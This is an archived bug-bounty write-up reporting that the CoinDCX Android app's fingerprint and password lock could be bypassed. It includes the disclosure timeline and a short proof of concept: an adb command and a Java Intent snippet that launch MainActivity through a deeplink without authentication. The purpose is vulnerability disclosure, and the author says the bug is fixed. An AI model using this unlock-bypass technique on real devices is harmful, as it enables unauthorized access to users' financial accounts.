---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-27_bypass-of-biometrics-password-security-functionality-for-android.md
original_filename: 2021-09-27_bypass-of-biometrics-password-security-functionality-for-android.md
title: Bypass of biometrics & password security functionality for Android
category: documents
detected_topics:
- command-injection
- mobile-security
tags:
- imported
- documents
- command-injection
- mobile-security
language: en
raw_sha256: c4a61ab358c2225ad986af67cee565221ab57c242fcf990bc7cf1f5063540eb4
text_sha256: 9c08d09e75043121dbbaf65dcfcb71073dab39d49fc40af7c3f42574c3fbfd0b
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Bypass of biometrics & password security functionality for Android

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-27_bypass-of-biometrics-password-security-functionality-for-android.md
- Source Type: markdown
- Detected Topics: command-injection, mobile-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `c4a61ab358c2225ad986af67cee565221ab57c242fcf990bc7cf1f5063540eb4`
- Text SHA256: `9c08d09e75043121dbbaf65dcfcb71073dab39d49fc40af7c3f42574c3fbfd0b`


## Content

---
title: "Bypass of biometrics & password security functionality for Android"
page_title: "Bypass of Biometrics & Password Security Functionality For android | by Dheeraj Madhukar | InfoSec Write-ups"
url: "https://medium.com/@dheerajkmadhukar/bypass-of-biometrics-password-security-functionality-for-android-8e0174ac7cac"
authors: ["Dheeraj Madhukar (@Dheerajmadhukar)"]
programs: ["CoinDCX"]
bugs: ["Authentication bypass", "Android"]
publication_date: "2021-09-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3281
scraped_via: "browseros"
---

# Bypass of biometrics & password security functionality for Android

Bypass of Biometrics & Password Security Functionality For android
Dheeraj Madhukar
Follow
1 min read
·
Sep 27, 2021

138

1

Reported : Sat, Feb 27, 8:52 PM — 2020
Reported Again : Mon, Nov 2, 2020, 3:12 AM
Req for an update : Sat, Nov 7, 2020, 10:02 AM
Another req for update : Wed, Nov 11, 2020, 12:20 PM
.
.
.

No response from COINDCX, then i decided to tweed and tag the authorities to reach them.
https://twitter.com/Dheerajmadhukar/status/1365683708104118277

https://twitter.com/nrjkhandelwal
https://twitter.com/smtgpt

Get Dheeraj Madhukar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Again nobody even care! ** BUT BUG IS FIXED **

Now you have the actual report ;) & POC

Asset:
com.coindcx (Android: Play Store)

Asset Details:
Version — 0.8.3
Updated — October 27, 2020

Test Android Device Details:
Non-rooted

Weakness:
Improper Authentication — Generic

Summary:
CoinDCX Android App has an option to unlock the app using fingerprint and password. But if “com.coindcx.MainActivity” activity triggers with “deeplink”, authentication is no longer required.

Step to Reproduce:
It is possible via ADB and Java (Android App):

ADB command:
$ adb shell am start -n com.coindcx/.MainActivity -d “https://coindcx.com"

Java (Android App):

Intent intent = new Intent();
intent.setClassName(“com.coindcx”, “com.coindcx.MainActivity”);
intent.setData(Uri.parse(“https://coindcx.com"));
startActivity(intent);

Impact:
Unauthorized access to use the application.

PoC [ Proof of Concept ]

Twitter profile: @Dheerajmadhukar

LinkedIn profile: @dheerajtechnolegends
